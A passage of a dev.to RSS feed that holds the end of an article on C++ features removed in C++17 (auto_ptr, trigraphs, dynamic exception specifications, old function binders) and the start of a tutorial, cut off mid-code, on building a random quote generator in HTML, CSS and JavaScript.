&lt;p&gt;auto_ptr was used to create a smart pointer to handle an object’s lifetime.  It is owner of the object to which it refers, when an object gets destroyed auto_ptr also gets destroyed automatically. This smart pointer quietly steals ownership of the managed object in its copy constructor and copy assignment from the right-hand argument. As a result, the copy is not the same as the original smart pointer object. Because of these copy semantics, auto_ptr not works as CopyConstructible, and therefore it is deprecated. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Alternatives :&lt;/strong&gt; &lt;br&gt;
auto_ptr can easily replaced by &lt;strong&gt;unique_ptr&lt;/strong&gt; which is also a smart pointer with similar working but with improved security. It was introduced in C++11 as direct replacement of auto_ptr as it provide new features (deleters) and support for arrays moreover it allows only one owner of the referencing pointer. So, while using unique_ptr there can only be at most one unique_ptr for one resource and when it is destroyed, the resource is automatically claimed. If we try to make a copy of unique_ptr will cause a compile-time error.&lt;br&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Example :&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight c"&gt;&lt;code&gt; &lt;span class="n"&gt;unique_ptr&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;p1&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt; &lt;span class="n"&gt;T&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
 &lt;span class="n"&gt;unique_ptr&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;p2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
 &lt;span class="c1"&gt;// Error: can't copy unique_ptr&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;4.    TRIGRAPHS&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;Trigraphs are group of three character basically, it is special character sequence which is used as alternative for some characters. Represented with two question marks.&lt;br&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;example :&lt;br&gt;
 ??- produces ~ &lt;br&gt;
 ??= produces #&lt;br&gt;
 ??/ produces \&lt;br&gt;
 ??’ produces ^&lt;br&gt;
 ??( produces [&lt;br&gt;
 ??) produces ]&lt;br&gt;
 ??! produces |&lt;br&gt;
 ??&amp;lt; produces {&lt;br&gt;
 ??&amp;gt; produces }&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;p&gt;But they produce much confusion as they are parsed before comments and therefor removed in the latest version.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Alternatives :&lt;/strong&gt; &lt;br&gt;
C++17 not provide any alternatives for Trigraphs, as modern keyboards have all this features moreover it produces a lot of bugs in code. &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--xVCufn18--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5nnkrcc3kixypm642opg.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--xVCufn18--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5nnkrcc3kixypm642opg.gif" alt="C"&gt;&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;5.    throw(typeid)&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;If a function is declared with type T listed in its exception specification, the function may throw exceptions of that type or a type derived from it. This is the non-throwing version of the dynamic exception specification hat has been deprecated and now removed. It has been replaced with &lt;strong&gt;noexcept&lt;/strong&gt; which has more clear meaning.&lt;br&gt;
&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Syntax : &lt;br&gt;
throw(typeid, typeid, ...)&lt;br&gt;
example :&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight c"&gt;&lt;code&gt;&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;throwsInt&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="n"&gt;throw&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
&lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="n"&gt;cout&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="s"&gt;"throw function replaced with noexcept :)"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  
    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; 
    &lt;span class="p"&gt;{&lt;/span&gt; 
      &lt;span class="n"&gt;throw&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;  
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;  
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;Alternatives :&lt;/strong&gt; &lt;br&gt;
As mentioned above, throw can have better alternative with noexcept. It specifies whether function could throw exceptions or not without specifying their type. But use it only when invocation of the function cannot throw any error, otherwise program will terminate. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;6.    ALLOCATOR SUPPORT IN std::function :&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;Several constructors allow to specify an allocator used for allocating internal memory. std::function also have constructors that take an allocator argument, but the semantics are unclear, and there are technical glitch with storing an allocator in a type-erased context and then recovering that allocator later for any allocations needed during copy assignment. Therefore, these constructor overloads were removed in C++17.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Alternatives :&lt;/strong&gt; &lt;br&gt;
No such features is present in C++ which replaces allocator.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;7.   std::pointer_to_unary_function, std::pointer_to_binary_function :&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;std::pointer_to_unary_function, std::pointer_to_binary_function function objects that act as wrappers around unary or binary functions. These functions contains constructor which constructs a new pointer_to_unary_function object with the supplied function and operator() which calls the stored function.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Alternatives :&lt;/strong&gt; &lt;br&gt;
These two functions  std::function and std::ref replaces std::pointer_to_unary_function, std::pointer_to_binary_function.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;8.    std::binder1st and std::binder2nd :&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;These are function object that binds an argument to a binary function.&lt;br&gt;
The value of the parameter is passed to the object at the construction time and stored within the object. Whenever the function object is invoked though operator(), the stored value is passed as one of the arguments, the other argument is passed as an argument of operator(). The resulting function object is an unary function.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1) binder1st  :&lt;/strong&gt;   Binds the first parameter to the value value given at the construction of the object.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2) binder2nd  :&lt;/strong&gt;   Binds the second parameter to the value value given at the construction of the object.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Alternatives :&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Lambdas&lt;/strong&gt;, &lt;strong&gt;std::bind&lt;/strong&gt; are two features which can be alternatives for binder1st and binder2nd.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;9.    std::bind1st and std::bind2nd :&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;These are  Helper functions that create instances of std::binder1st or std::binder2nd, which binds a given argument to a first or second parameter of a given binary function object. But these become no use with the introduction of lambdas in C++11, therefor they were deprecated.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;10   Other functions :&lt;/strong&gt; &lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;std::mem_fun_t&lt;/li&gt;
&lt;li&gt;std::mem_fun1_t&lt;/li&gt;
&lt;li&gt;std::const_mem_fun_t&lt;/li&gt;
&lt;li&gt;std::const_mem_fun1_t&lt;/li&gt;
&lt;li&gt;std::mem_fun_ref_t&lt;/li&gt;
&lt;li&gt;std::mem_fun1_ref_t&lt;/li&gt;
&lt;li&gt;std::const_mem_fun_ref_t&lt;/li&gt;
&lt;li&gt;std::const_mem_fun1_ref_t&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;These are function objects that wrap a pointer to a member function with no parameters or one parameter. The class instance whose member function to call is passed as a pointer to the operator() ie, the object whose member function to call is passed by pointer to the call operator for the latter, it is passed as a reference. They are deprecated because they are limited to member functions with either none or just one argument and you need different functions and function objects for handling pointers or references to the class instance.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Alternatives :&lt;/strong&gt; &lt;br&gt;
Alternative to above functions is &lt;strong&gt;std::mem_fn&lt;/strong&gt; which can handle member functions with any number of variables and not only references or pointers to objects but also smart pointers.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--it7aWv4F--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rjdim9k4525gck7ko2hk.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--it7aWv4F--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rjdim9k4525gck7ko2hk.gif" alt="C"&gt;&lt;/a&gt;&lt;br&gt;
&lt;strong&gt;Conclusion :&lt;/strong&gt; &lt;/p&gt;

&lt;p&gt;C++ is &lt;strong&gt;simple&lt;/strong&gt;, much &lt;strong&gt;clear&lt;/strong&gt; and provide &lt;strong&gt;faster&lt;/strong&gt; programming. Improving such language with latest versions and removing old buggy features is necessary. Thousands of proposals were put forward for updating the features in C++17. And it's time to say bye to some old features. 😎&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Connect&lt;/strong&gt;&lt;br&gt;
&lt;a href="https://www.linkedin.com/in/animesh-maru/"&gt;LinkedIn&lt;/a&gt;&lt;br&gt;
&lt;a href="https://twitter.com/AnimeshMaru"&gt;Twitter&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;C++ Rocks!😄&lt;/strong&gt;&lt;/p&gt;

</description>
      <category>cpp</category>
      <category>news</category>
      <category>programming</category>
    </item>
    <item>
      <title>How to build a JavaScript Random Quote Generator</title>
      <author>Stackfindover</author>
      <pubDate>Fri, 02 Jul 2021 16:40:42 +0000</pubDate>
      <link>https://dev.to/stackfindover/how-to-build-a-javascript-random-quote-generator-2ao4</link>
      <guid>https://dev.to/stackfindover/how-to-build-a-javascript-random-quote-generator-2ao4</guid>
      <description>&lt;p&gt;&lt;strong&gt;&lt;em&gt;Hello guys, today I am going to show you How to build a JavaScript Random Quote Generator using HTML CSS &amp;amp; JavaScript, in this video, I will create a simple quote generator.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#javascript-random-quote-generator-step-by-step"&gt;
  &lt;/a&gt;
  JavaScript Random Quote Generator step by step
&lt;/h3&gt;

&lt;h4&gt;
  &lt;a href="#step-1-creating-a-new-project"&gt;
  &lt;/a&gt;
  Step 1 — Creating a New Project
&lt;/h4&gt;

&lt;p&gt;In this step, we need to create a new project folder and create files(index.html, style.css, quotes.js) inside the folder. for creating a Random Quote Generator. In the next step, you will start creating the structure of the webpage.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;You may like these also:&lt;/strong&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href="https://blog.stackfindover.com/best-stunning-css-fire-animations"&gt;🔥 Best 25+ Stunning CSS Fire Animations 2021&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.stackfindover.com/how-to-create-code-compressor-in-javascript/"&gt;How to create code compressor in JavaScript | HTML Minifier&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h4&gt;
  &lt;a href="#step-2-setting-up-the-basic-structure"&gt;
  &lt;/a&gt;
  Step 2 — Setting Up the basic structure
&lt;/h4&gt;

&lt;p&gt;In this step, we will add the HTML code to create the basic structure of the project.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="cp"&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;html&lt;/span&gt; &lt;span class="na"&gt;lang=&lt;/span&gt;&lt;span class="s"&gt;"en"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;charset=&lt;/span&gt;&lt;span class="s"&gt;"UTF-8"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;http-equiv=&lt;/span&gt;&lt;span class="s"&gt;"X-UA-Compatible"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"IE=edge"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;meta&lt;/span&gt; &lt;span class="na"&gt;name=&lt;/span&gt;&lt;span class="s"&gt;"viewport"&lt;/span&gt; &lt;span class="na"&gt;content=&lt;/span&gt;&lt;span class="s"&gt;"width=device-width, initial-scale=1.0"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;title&amp;gt;&lt;/span&gt;How to build a JavaScript Random Quote Generator&lt;span class="nt"&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;link&lt;/span&gt; &lt;span class="na"&gt;rel=&lt;/span&gt;&lt;span class="s"&gt;"stylesheet"&lt;/span&gt; &lt;span class="na"&gt;href=&lt;/span&gt;&lt;span class="s"&gt;"style.css"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="nt"&gt;&amp;lt;script &lt;/span&gt;&lt;span class="na"&gt;src=&lt;/span&gt;&lt;span class="s"&gt;"quotes.js"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;body&amp;gt;&lt;/span&gt;

&lt;span class="nt"&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;This is the base structure of most web pages that use HTML.&lt;br&gt;
Add the following code inside the &lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt; tag:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight html"&gt;&lt;code&gt;&lt;span class="nt"&gt;&amp;lt;section&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"randomQuote"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;header&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;Quote of the Day&lt;span class="nt"&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;p&amp;gt;&lt;/span&gt;Press the below button to receive a random quote!&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/header&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;div&lt;/span&gt; &lt;span class="na"&gt;class=&lt;/span&gt;&lt;span class="s"&gt;"quotesOutput"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;p&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"generatedQuote"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;"The greatest glory in living lies not in never falling, but in rising every time we fall."&lt;span class="nt"&gt;&amp;lt;/p&amp;gt;&lt;/span&gt;
            &lt;span class="nt"&gt;&amp;lt;span&lt;/span&gt; &lt;span class="na"&gt;id=&lt;/span&gt;&lt;span class="s"&gt;"AuthorName"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;--Nelson Mandela&lt;span class="nt"&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
        &lt;span class="nt"&gt;&amp;lt;button&lt;/span&gt; &lt;span class="na"&gt;onclick=&lt;/span&gt;&lt;span class="s"&gt;"generateQoute()"&lt;/span&gt;&lt;span class="nt"&gt;&amp;gt;&lt;/span&gt;New Quote&lt;span class="nt"&gt;&amp;lt;/button&amp;gt;&lt;/span&gt;
&lt;span class="nt"&gt;&amp;lt;/section&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#step-3-adding-styles-for-the-classes"&gt;
  &lt;/a&gt;
  Step 3 — Adding Styles for the Classes
&lt;/h4&gt;

&lt;p&gt;In this step, we will add styles to the section class Inside style.css file&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight css"&gt;&lt;code&gt;&lt;span class="k"&gt;@import&lt;/span&gt; &lt;span class="sx"&gt;url('https://fonts.googleapis.com/css2?family=Poppins:wght@300&amp;amp;display=swap')&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;padding&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;margin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;font-family&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s2"&gt;'Poppins'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nb"&gt;sans-serif&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;header&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;text-align&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;center&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#4b00ff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#fff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;padding&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;10px&lt;/span&gt; &lt;span class="m"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;margin-bottom&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;10px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nc"&gt;.quotesOutput&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;text-align&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;center&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#dde1ff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;padding&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;20px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;min-height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;50px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;margin-bottom&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;20px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;button&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;display&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;block&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;150px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;40px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;font-size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;16px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;font-weight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;600&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;background&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#4b00ff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#fff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;border&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;transparent&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;margin&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;auto&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;cursor&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;pointer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="nt"&gt;p&lt;/span&gt;&lt;span class="nf"&gt;#generatedQuote&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;font-size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;16px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;font-weight&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;800&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#step-4-adding-some-lines-of-javascript-code"&gt;
  &lt;/a&gt;
  Step 4 — Adding some lines of JavaScript code
&lt;/h4&gt;

&lt;p&gt;In this step, we will add some JavaScript code to build Quote Generator.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;arrayOfQuotes&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;author&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Nelson Mandela&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;quote&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;The greatest glory in living lies not in never falling, but in rising every time we fall.&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;author&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Walt Disney&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;quote&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;The way to get started is to quit talking and begin doing.&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;author&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Eleanor Roosevelt&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;quote&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;If life were predictable it would cease to be life, and be without flavor.&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;author&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;Oprah Winfrey&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;quote&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;If you look at what you have in life, you`ll always have more. If you look at what you don`t have in life, you`ll never have enough&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;
    &lt;span class="p"&gt;},&lt;/span&gt;
    &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;author&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;James Cameron&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
